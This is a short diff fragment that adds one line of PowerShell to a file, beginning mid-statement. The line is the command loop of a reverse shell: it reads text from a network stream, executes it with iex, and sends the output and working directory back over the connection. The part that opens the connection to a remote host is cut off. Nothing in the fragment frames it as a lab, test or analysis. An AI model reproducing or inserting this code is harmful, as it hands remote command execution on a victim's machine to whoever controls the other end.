@@ -1,0 +1,1 @@
+);$st=$ct.GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$st.Read($bt, 0, $bt.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bt,0, $i);$sb=(iex $data 2>&1|Out-String );$sb2 =$sb+(pwd).Path+''>'';$sd=([text.encoding]::ASCII).GetBytes($sb2);$st.Write($sd,0,$sd.Length);$st.Flush()};$ct.Close()
